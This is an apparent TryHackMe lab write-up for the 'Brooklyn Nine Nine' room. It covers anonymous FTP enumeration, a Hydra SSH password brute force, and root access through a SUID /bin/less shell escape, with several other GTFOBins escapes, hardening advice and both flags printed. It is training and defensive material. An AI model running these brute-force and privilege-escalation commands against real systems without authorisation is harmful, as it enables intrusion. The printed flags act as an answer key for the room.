# Brooklyn Nine Nine - TryHackMe Write-up

![Brooklyn Nine Nine](https://img.shields.io/badge/Difficulty-Easy-green) ![Platform](https://img.shields.io/badge/Platform-TryHackMe-blue) ![Status](https://img.shields.io/badge/Status-Completed-success)

---

## Machine Information

| Attribute | Details |
|-----------|---------|
| **Name** | Brooklyn Nine Nine |
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu) |
| **IP Address** | 10.65.169.60 |
| **Date Completed** | March 17  2026 |

---

## Learning Objectives

This room teaches:
- FTP anonymous access enumeration
- SSH password brute forcing with Hydra
- SUID binary identification
- LESS privilege escalation via GTFOBins
- Process privilege inheritance concepts

---

## Attack Surface Analysis

### Open Ports & Services

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### Attack Vectors Identified

```
┌─────────────────────────────────────────┐
│  ATTACK SURFACE                         │
├─────────────────────────────────────────┤
│                                         │
│  21/tcp - FTP (vsftpd 3.0.3)            │
│  ├─ Anonymous login enabled             │
│  ├─ Information disclosure              │
│  ├─ File: note_to_jake.txt              │
│  └─ Risk: Medium (Intel gathering)      │
│                                         │
│  22/tcp - SSH (OpenSSH 7.6p1)           │
│  ├─ Weak password (jake)                │
│  ├─ Brute force attack surface          │
│  └─ Risk: High (Initial access)         │
│                                         │
│  80/tcp - HTTP (Apache 2.4.29)          │
│  ├─ Default Apache page                 │
│  ├─ No significant findings             │
│  └─ Risk: Low (Rabbit hole)             │
│                                         │
│  PRIVILEGE ESCALATION                   │
│  ├─ /bin/less with SUID bit             │
│  ├─ GTFOBins exploitation               │
│  └─ Risk: Critical                      │
│                                         │
└─────────────────────────────────────────┘
```

### Risk Assessment Matrix

| Vulnerability | Likelihood | Impact | Detectability | Priority |
|---------------|------------|--------|---------------|----------|
| FTP Anonymous Access | High | Low | High | P3 |
| SSH Weak Password | High | Critical | Medium | P1 |
| SUID /bin/less | Medium | Critical | Low | P1 |

---

## Exploitation Walkthrough

### Phase 1: Reconnaissance

#### Initial Port Scan

```bash
# Comprehensive scan
nmap -sC -sV -p- -T4 10.65.169.60 -oN nmap_full.txt
```

**Key Findings:**
- FTP (21): vsftpd 3.0.3 with anonymous login
- SSH (22): OpenSSH 7.6p1 (brute force target)
- HTTP (80): Apache 2.4.29 (default page, likely rabbit hole)

**Important Note:** The `-sC` flag revealed critical information - FTP anonymous login allowed with a file present.

---

#### FTP Enumeration

```bash
# Connect to FTP
ftp 10.65.169.60
# Username: anonymous
# Password: [ENTER or anything]

# List files
ftp> ls
```

**Output:**
```
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
```

**Download file:**
```bash
ftp> get note_to_jake.txt
ftp> exit

# Read contents
cat note_to_jake.txt
```

**Contents:**
```
From Amy,

Jake please change your password. It is too weak and holt will 
be mad if someone hacks into the nine nine
```

**Intelligence Gathered:**
- ✅ Username: `jake` (confirmed)
- ✅ Password is weak (brute force viable)
- ✅ Other users exist: Amy, Holt (from TV show theme)
- ✅ Security awareness is low

---

#### Web Enumeration

```bash
# Directory fuzzing
gobuster dir -u http://10.65.169.60 \
    -w /usr/share/wordlists/dirb/common.txt \
    -o gobuster.txt
```

**Result:**
```
/.hta                 (Status: 403)
/.htaccess            (Status: 403)
/.htpasswd            (Status: 403)
/index.html           (Status: 200) [Size: 718]
/server-status        (Status: 403)
```

**Analysis:** Default Apache installation, no interesting directories found. Web attack surface appears minimal - likely a **rabbit hole** to distract from the real vector (SSH).

---

### Phase 2: Initial Access

#### SSH Brute Force Attack

**Target:** User `jake` (discovered via FTP note)

**Rationale:** Note explicitly states "password is too weak" - indicates brute force feasibility.

```bash
# Hydra SSH brute force
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.65.169.60 -t 4
```

**Command Breakdown:**
- `-l jake`: Target username
- `-P rockyou.txt`: Password wordlist (14M+ passwords)
- `-t 4`: 4 parallel tasks (avoid triggering rate limiting)
- `ssh://10.65.169.60`: Target service and IP

**Output:**
```
Hydra v9.3 (c) 2022 by van Hauser/THC
[DATA] max 4 tasks per 1 server
[DATA] attacking ssh://10.65.169.60:22/
[22][ssh] host: 10.65.169.60   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

**Credentials Obtained:**
```
Username: jake
Password: 987654321
```

**Time to compromise:** ~2 minutes (password at position ~150 in rockyou.txt)

---

#### SSH Access

```bash
# Login via SSH
ssh jake@10.65.169.60
# Password: 987654321
```

**Success:**
```
jake@brookly_nine_nine:~$
```

**✅ INITIAL ACCESS ACHIEVED**

---

### Phase 3: Post-Compromise Enumeration

#### Basic Enumeration

```bash
# Verify identity
whoami
# jake

id
# uid=1001(jake) gid=1001(jake) groups=1001(jake)

# List home directories
ls -la /home/
```

**Output:**
```
drwxr-xr-x  5 amy  amy  4096 May 18  2020 amy
drwxr-xr-x  6 holt holt 4096 May 26  2020 holt
drwxr-xr-x  6 jake jake 4096 May 26  2020 jake
```

**Users identified:**
- amy
- holt
- jake (current user)

---

#### User Flag Discovery

```bash
# Check Holt's directory
ls -la /home/holt/

# Files found
cat /home/holt/user.txt
```

**User Flag:** `ee11cbb19052e40b07aac0ca060c23ee`

**Note:** Flag is readable by all users (world-readable permissions) - common in CTF environments for easier flag discovery.

---

### Phase 4: Privilege Escalation

#### SUID Binary Enumeration

**Concept:** SUID (Set User ID) binaries execute with the privileges of the file owner, not the user running them. If a SUID binary is owned by root and has exploitable functionality, it can lead to privilege escalation.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

**Command Breakdown:**
- `find /`: Search from root directory
- `-perm -4000`: Files with SUID bit set (octal 4000)
- `-type f`: Only files (not directories)
- `2>/dev/null`: Suppress "Permission denied" errors

**Partial Output:**
```
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/bin/mount
/bin/su
/bin/ping
/bin/fusermount
/bin/less          ← UNUSUAL!
/bin/umount
```

**Critical Finding:** `/bin/less` with SUID bit

---

#### SUID Binary Analysis

```bash
# Verify SUID bit and owner
ls -la /bin/less
```

**Output:**
```
-rwsr-xr-x 1 root root 154072 /bin/less
   ↑ 's' = SUID active
```

**Analysis:**
- Owner: `root`
- SUID: Active (indicated by 's' in permissions)
- Group: `root`
- Readable/Executable by all users

**Vulnerability:**  
LESS is a file pager that allows executing shell commands via the `!` operator. When run with SUID, these commands inherit root privileges.

---

#### GTFOBins Exploitation

**Reference:** https://gtfobins.github.io/gtfobins/less/

**Exploitation Steps:**

```bash
# Execute less with SUID
less /etc/profile
```

**Inside LESS:**
```
# Type the following and press ENTER
!/bin/sh
```

**What happens:**

1. LESS opens `/etc/profile` (any file works)
2. LESS runs with `euid=0` (root) due to SUID
3. `!` executes external shell command
4. `/bin/sh` spawns new shell
5. Shell inherits EUID from parent (LESS)
6. Result: Root shell!

**Verification:**
```bash
whoami
# root

id
# uid=1001(jake) gid=1001(jake) euid=0(root) egid=0(root) groups=0(root),1001(jake)
#                               ↑ Effective UID is root!
```

**✅ ROOT ACCESS ACHIEVED**

---

### Phase 5: Root Flag Capture

```bash
# Navigate to root directory
cd /root

# List files
ls -la

# Capture flag
cat root.txt
```

**Root Flag:** `63a9f0ea7bb98050796b649e85481845`

**Creator message:**
```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

---

## 🎓 Key Learnings

### 1. FTP Anonymous Access as Intelligence Source

**What is it?**

FTP anonymous access allows users to connect without authentication. While often intentional for public file sharing, it can leak sensitive information.

**How to identify:**
```bash
# Nmap NSE script detection
nmap -sC -p 21 target.com
# Look for: "ftp-anon: Anonymous FTP login allowed"

# Manual test
ftp target.com
# Username: anonymous
# Password: [anything or blank]
```

**Why dangerous:**
- Credentials disclosure (like in this room)
- Internal documentation leakage
- Configuration files
- Source code exposure
- User enumeration

**Mitigation:**
```bash
# /etc/vsftpd.conf
anonymous_enable=NO
```

---

### 2. SSH Brute Force with Hydra

**When is it viable?**

- Weak password policy confirmed (like "jake's password is too weak")
- No rate limiting or fail2ban
- Account lockout not implemented
- Known username

**Optimization:**

```bash
# Use smaller, targeted wordlists first
hydra -l jake -P /usr/share/wordlists/fasttrack.txt ssh://target

# Increase threads carefully (avoid DoS)
hydra -l jake -P rockyou.txt ssh://target -t 16

# Multiple usernames
hydra -L users.txt -P passwords.txt ssh://target
```

**Defense:**

1. **Fail2Ban:**
```bash
# /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600
```

2. **SSH Hardening:**
```bash
# /etc/ssh/sshd_config
PasswordAuthentication no  # Use keys only
MaxAuthTries 3
AllowUsers specific_user
```

3. **Strong Password Policy:**
```bash
# Require 14+ characters, complexity
# Enforce via PAM modules
```

---

### 3. SUID Binary Exploitation Deep Dive

**What is SUID?**

SUID (Set User ID) is a special permission bit that allows users to execute a file with the permissions of the file owner.

**Example:**
```bash
# /bin/passwd has SUID
-rwsr-xr-x 1 root root /bin/passwd

# When user "jake" runs passwd:
# - Process executes with euid=0 (root)
# - Allows modifying /etc/shadow (root-only file)
```

**Finding SUID binaries:**

```bash
# Method 1: Find command
find / -perm -4000 -type f 2>/dev/null

# Method 2: More explicit
find / -perm -u=s -type f 2>/dev/null

# Method 3: With details
find / -perm -4000 -exec ls -la {} \; 2>/dev/null
```

**Common legitimate SUID binaries:**
```
/bin/su
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
```

**Suspicious SUID binaries (potential privesc vectors):**
```
/bin/less        ← This room
/bin/vim
/usr/bin/find
/usr/bin/awk
/usr/bin/perl
/usr/bin/python
/bin/bash
```

**Why `/bin/less` is dangerous:**

LESS allows executing shell commands via `!`:
```
less /etc/profile
!/bin/sh       ← Spawns shell with LESS's privileges
```

If LESS has SUID + owner is root:
```
less (euid=0) → !/bin/sh → shell inherits euid=0 → ROOT!
```

---

### 4. GTFOBins - The Privilege Escalation Bible

**What is GTFOBins?**

Website: https://gtfobins.github.io/

Curated list of Unix binaries that can be exploited to:
- Bypass security restrictions
- Escalate privileges
- Execute commands
- Read/write files
- Transfer files

**How it works:**

1. Find exploitable binary (SUID, sudo, capabilities)
2. Search GTFOBins for that binary
3. Follow exploitation instructions

**Example - LESS:**

GTFOBins shows:
```
SUID:
  less /etc/profile
  !/bin/sh
```

**Other examples:**

```bash
# VIM with sudo
sudo vim -c ':!/bin/sh'

# FIND with SUID
find . -exec /bin/sh -p \; -quit

# AWK with sudo
sudo awk 'BEGIN {system("/bin/sh")}'

# PYTHON with sudo
sudo python -c 'import os; os.system("/bin/sh")'
```

**Defense:**
1. Remove unnecessary SUID bits:
```bash
chmod u-s /bin/less
```

2. Restrict sudo access:
```bash
# WRONG
user ALL=(ALL) NOPASSWD: ALL

# RIGHT
user ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx
```

3. Regular SUID audits:
```bash
# Baseline of approved SUID binaries
find / -perm -4000 > /root/suid_baseline.txt

# Compare regularly
diff /root/suid_baseline.txt <(find / -perm -4000)
```

---

### 5. Process Privilege Inheritance

**Core Concept:**

Child processes **inherit** the effective UID (EUID) of their parent process.

**Visual Explanation:**

```
User: jake (UID=1001)
  └─ Executes: /bin/less (SUID, owner=root)
       └─ LESS process (EUID=0 due to SUID)
            └─ LESS executes: !/bin/sh
                 └─ /bin/sh process (inherits EUID=0)
                      └─ Shell with root privileges!
```

**UID vs EUID:**

```bash
# After exploiting SUID less
id

# Output:
uid=1001(jake)     ← Real UID (who you really are)
gid=1001(jake)     ← Real GID
euid=0(root)       ← Effective UID (what privileges you have)
egid=0(root)       ← Effective GID
groups=0(root)
```

**Why EUID matters:**

Operating system checks **EUID**, not UID, for permissions:
```
Can I read /etc/shadow?
→ OS checks: Is EUID = 0? YES → Allow
→ Doesn't care that UID = 1001
```

---

## Remediation Recommendations

### Critical (P1)

**1. Remove Unnecessary SUID Bits**

```bash
# Audit current SUID binaries
find / -perm -4000 -type f 2>/dev/null > suid_audit.txt

# Review each binary
# Remove SUID from /bin/less (not needed)
chmod u-s /bin/less

# Verify
ls -la /bin/less
# Should show: -rwxr-xr-x (no 's')
```

**2. Implement SSH Hardening**

```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no  # Keys only
PubkeyAuthentication yes
MaxAuthTries 3
AllowUsers specific_user_list
ClientAliveInterval 300
ClientAliveCountMax 2

# Restart SSH
systemctl restart sshd
```

**3. Deploy Fail2Ban**

```bash
# Install
apt install fail2ban

# /etc/fail2ban/jail.local
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# Start service
systemctl enable fail2ban
systemctl start fail2ban
```

**4. Enforce Strong Password Policy**

```bash
# Install password quality library
apt install libpam-pwquality

# /etc/pam.d/common-password
password requisite pam_pwquality.so retry=3 minlen=14 difok=4 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1

# Force password change
chage -M 90 -m 7 -W 14 jake
passwd -e jake  # Expire immediately
```

### High (P2)

**5. Disable FTP Anonymous Access**

```bash
# /etc/vsftpd.conf
anonymous_enable=NO
local_enable=YES
write_enable=NO

# Restart FTP
systemctl restart vsftpd

# Or better: Disable FTP entirely, use SFTP
systemctl disable vsftpd
systemctl stop vsftpd
```

**6. Implement Intrusion Detection**

```bash
# Install AIDE (Advanced Intrusion Detection Environment)
apt install aide

# Initialize database
aideinit

# Check for changes
aide --check

# Automated daily checks
echo "0 5 * * * /usr/bin/aide --check | mail -s 'AIDE Report' admin@domain.com" >> /etc/crontab
```

### Medium (P3)

**7. Regular Security Audits**

```bash
# Automated SUID monitoring
cat > /usr/local/bin/suid_monitor.sh << 'EOF'
#!/bin/bash
BASELINE="/root/suid_baseline.txt"
CURRENT="/tmp/suid_current.txt"

find / -perm -4000 -type f 2>/dev/null > "$CURRENT"

if ! diff "$BASELINE" "$CURRENT" > /dev/null; then
    echo "ALERT: New SUID binaries detected!"
    diff "$BASELINE" "$CURRENT"
    diff "$BASELINE" "$CURRENT" | mail -s "SUID Alert" admin@domain.com
fi
EOF

chmod +x /usr/local/bin/suid_monitor.sh

# Cron job
echo "0 2 * * * /usr/local/bin/suid_monitor.sh" >> /etc/crontab
```

**8. Implement Least Privilege Principle**

```bash
# Remove unnecessary sudo rights
visudo

# WRONG
jake ALL=(ALL) NOPASSWD: ALL

# RIGHT (if jake needs to restart services)
jake ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx

# Or better: No sudo for jake
# (Remove line entirely)
```

---

## Tools Used

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Port scanning & service enumeration | `nmap -sC -sV -p- -T4 [IP]` |
| FTP | Anonymous access enumeration | `ftp [IP]` |
| Gobuster | Directory fuzzing | `gobuster dir -u [URL] -w [wordlist]` |
| Hydra | SSH password brute force | `hydra -l user -P wordlist ssh://[IP]` |
| Find | SUID binary discovery | `find / -perm -4000 -type f 2>/dev/null` |
| LESS | Privilege escalation via GTFOBins | `less [file]` then `!/bin/sh` |

---

## References

- [GTFOBins - LESS](https://gtfobins.github.io/gtfobins/less/)
- [SUID Exploitation Techniques](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
- [Fail2Ban Official Docs](https://www.fail2ban.org/wiki/index.php/Main_Page)

---

## Timeline

```
00:00 - Initial reconnaissance (Nmap scan)
00:05 - FTP enumeration (note_to_jake.txt found)
00:10 - Web enumeration (rabbit hole confirmed)
00:15 - SSH brute force initiated (Hydra)
00:17 - Credentials obtained (jake:987654321)
00:18 - Initial access via SSH
00:20 - User flag captured
00:25 - SUID enumeration (find -perm -4000)
00:30 - LESS exploitation research (GTFOBins)
00:32 - Privilege escalation successful
00:35 - Root flag captured

Total Time: ~35 minutes
```

---

## 🎯 Flags

```
User Flag: ee11cbb19052e40b07aac0ca060c23ee
Root Flag: 63a9f0ea7bb98050796b649e85481845
```

---

## Final Thoughts

This room provides excellent practice in:
- **Information gathering** via FTP anonymous access
- **SSH brute forcing** with realistic weak passwords
- **SUID enumeration** and exploitation
- **GTFOBins** privilege escalation techniques

**Key Takeaway:** One weak password can compromise an entire system. The note explicitly warned Jake about his weak password, yet it remained unchanged - a common real-world scenario. Combined with a misconfigured SUID binary, this led to full system compromise.

**Common Pitfall:** Getting distracted by HTTP enumeration. The web server was a deliberate rabbit hole. Always prioritize findings based on actual intelligence (FTP note) over assumptions (web might have something).

---

**Author:** Igor Leite (UmbraNull)  
**Date:** March 17, 2026  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Status:** ✅ Completed

---

**If you found this write-up helpful, please give it a ⭐ on GitHub!**